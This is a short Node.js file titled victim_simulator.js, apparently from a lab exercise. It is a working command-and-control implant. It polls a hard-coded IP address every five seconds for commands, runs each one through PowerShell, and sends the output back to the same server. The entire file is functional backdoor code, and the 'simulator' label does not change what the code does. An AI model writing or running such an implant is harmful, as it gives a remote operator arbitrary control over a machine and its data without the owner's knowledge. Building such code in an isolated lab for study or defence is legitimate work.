// victim_simulator.js
const fetch = require('node-fetch');
const { exec } = require('child_process');

// Explicitly set fetch globally (just in case)
global.fetch = fetch;

const COMMANDS_URL = 'http://172.23.240.82:3000/commands';
const RESULTS_URL = 'http://172.23.240.82:3000/output';

async function pollCommands() {
  try {
    const response = await fetch(COMMANDS_URL);
    if (!response.ok) {
      console.error('Failed to fetch commands:', response.statusText);
      return;
    }
    const commands = await response.json();
    for (const command of commands) {
      console.log('Executing command:', command);
      await executeCommand(command);
    }
  } catch (err) {
    console.error('Error polling commands:', err);
  }
}

function executeCommand(command) {
  return new Promise((resolve) => {
    exec(`powershell.exe -Command "${command}"`, { shell: true }, async (error, stdout, stderr) => {
      const result = {
        command,
        stdout: stdout.trim(),
        stderr: stderr.trim(),
        error: error ? error.message : null,
      };

      console.log('Command result:', result);

      try {
        await fetch(RESULTS_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(result),
        });
      } catch (sendErr) {
        console.error('Error sending result:', sendErr);
      }
      resolve();
    });
  });
}

async function main() {
  while (true) {
    await pollCommands();
    await new Promise(res => setTimeout(res, 5000));
  }
}

main();
